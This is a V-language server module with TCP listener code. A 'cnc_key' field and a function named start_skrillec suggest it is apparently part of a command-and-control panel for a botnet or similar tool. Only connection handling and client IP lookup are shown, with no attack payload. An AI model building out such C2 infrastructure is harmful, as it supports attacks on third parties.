module server

import os
import net
import time
import server

pub struct Clients{
	pub mut:
		user_count		int
		u_name			[]string
		u_sockets		[]net.TcpConn
		u_ip			[]string
		u_port			[]int
		using_client	[]bool
}

pub struct Server{
	pub mut:
		port 			string
		cnc_key 		string
		// clients			&Clients
}


pub fn (mut s Server) start_skrillec(port int, mut start_clients server.Server) {
	mut svr := net.listen_tcp(.ip6, ":$port") or { panic("[x] Error, Unable to bind server. Port is being used!") }
	for {
		mut socket := svr.accept() or { panic("[x] Error, Unable to accept the incoming connection!") }
		socket.set_read_timeout(time.infinite)
		go s.connection_handler(mut socket, mut &start_clients)
	}
}

pub fn (mut s Server) connection_handler(mut socket net.TcpConn, mut server_s server.Server) {
	mut user_ip := socket.peer_addr() or { return }
	server.cmd_handler(mut socket, mut &server_s)
}

/*
	Struct User Lookup Functions
*/

pub fn (mut c Clients) get_ip(username string) string {
	for i in 0..(c.u_sockets).len {
		if c.u_name[i] == username {
			ip := c.u_sockets[i].peer_addr() or { panic("[x] Error") }
			return "$ip"
		}
	}
	return ""
}
